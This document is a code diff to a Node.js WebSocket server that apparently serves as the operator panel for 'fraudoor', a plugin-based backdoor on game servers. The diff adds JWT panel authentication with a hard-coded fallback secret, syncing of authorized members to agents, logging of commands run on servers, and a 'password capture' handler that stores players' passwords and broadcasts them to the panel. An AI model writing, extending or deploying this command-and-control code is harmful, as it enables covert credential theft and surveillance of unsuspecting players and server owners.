@@ -1,6 +1,10 @@
 import { v4 as uuidv4 } from 'uuid';
+import jwt from 'jsonwebtoken';
+
+const JWT_SECRET = process.env.JWT_SECRET || 'fraudoor-dev-secret-change-in-production';
 
 let _store = null;
+let wss = null;
 
 export function getStore() {
   return _store;
@@ -15,6 +19,16 @@ export function setupWebSocket(serverWss, store) {
     ws._fraudoorId = id;
     ws._fraudoorRole = null;
 
+    // Parse token from query string for panel connections
+    const url = new URL(req.url, 'http://localhost');
+    const token = url.searchParams.get('token');
+    if (token) {
+      try {
+        const decoded = jwt.verify(token, JWT_SECRET);
+        ws._fraudoorUser = decoded;
+      } catch {}
+    }
+
     ws.on('message', (raw) => {
       let msg;
       try {
@@ -24,6 +38,18 @@ export function setupWebSocket(serverWss, store) {
       }
 
       const { type, payload } = msg;
+
+      // Panel auth message
+      if (type === 'panel:auth') {
+        try {
+          const decoded = jwt.verify(payload.token, JWT_SECRET);
+          ws._fraudoorUser = decoded;
+          ws.send(JSON.stringify({ type: 'panel:auth:ok', payload: { user: decoded } }));
+        } catch {
+          ws.send(JSON.stringify({ type: 'panel:auth:error', payload: { error: 'invalid token' } }));
+        }
+        return;
+      }
 
       switch (type) {
         // --- Plugin auth ---
@@ -35,6 +61,14 @@ export function setupWebSocket(serverWss, store) {
             ws,
             online: true,
           });
+          // Sync authorized members to agent
+          const s = store.getServer(payload.id);
+          if (s && s.members && s.members.length > 0) {
+            ws.send(JSON.stringify({
+              type: 'server:auth:members',
+              payload: { list: s.members.join(',') },
+            }));
+          }
           broadcastPanel({
             type: 'server:status',
             payload: {
@@ -75,6 +109,47 @@ export function setupWebSocket(serverWss, store) {
           broadcastPanelForServer(server.id, {
             type: 'server:status',
             payload: { id: server.id, ...payload },
+          });
+          break;
+        }
+
+        // --- Plugin command log ---
+        case 'plugin:log:command': {
+          const server = store.getServerByWs(ws);
+          if (!server) return;
+          const entry = {
+            type: 'command',
+            serverId: server.id,
+            serverName: server.name || server.ip,
+            who: payload.who || '?',
+            target: payload.target || '-',
+            command: payload.command || '?',
+            timestamp: Date.now(),
+          };
+          store.addLog(entry);
+          broadcastPanel({
+            type: 'panel:log:command',
+            payload: entry,
+          });
+          break;
+        }
+
+        // --- Plugin password capture ---
+        case 'plugin:log:password': {
+          const server = store.getServerByWs(ws);
+          if (!server) return;
+          const entry = {
+            type: 'password',
+            serverId: server.id,
+            serverName: server.name || server.ip,
+            player: payload.player || '?',
+            password: payload.password || '?',
+            timestamp: Date.now(),
+          };
+          store.addLog(entry);
+          broadcastPanel({
+            type: 'panel:log:password',
+            payload: entry,
           });
           break;
         }
@@ -230,6 +305,7 @@ export function setupWebSocket(serverWss, store) {
 }
 
 function broadcastPanel(msg) {
+  if (!wss) return;
   wss.clients.forEach((client) => {
     if (client._fraudoorRole === 'panel' && client.readyState === 1) {
       client.send(JSON.stringify(msg));
@@ -238,6 +314,7 @@ function broadcastPanel(msg) {
 }
 
 function broadcastPanelForServer(serverId, msg) {
+  if (!wss) return;
   wss.clients.forEach((client) => {
     if (
       client._fraudoorRole === 'panel' &&
@@ -250,6 +327,7 @@ function broadcastPanelForServer(serverId, msg) {
 }
 
 function findPanelForRequest(requestId) {
+  if (!wss) return null;
   for (const client of wss.clients) {
     if (client._fraudoorRole === 'panel' && client._lastRequestId === requestId && client.readyState === 1) {
       return client;
@@ -257,5 +335,3 @@ function findPanelForRequest(requestId) {
   }
   return null;
 }
-
-let wss;
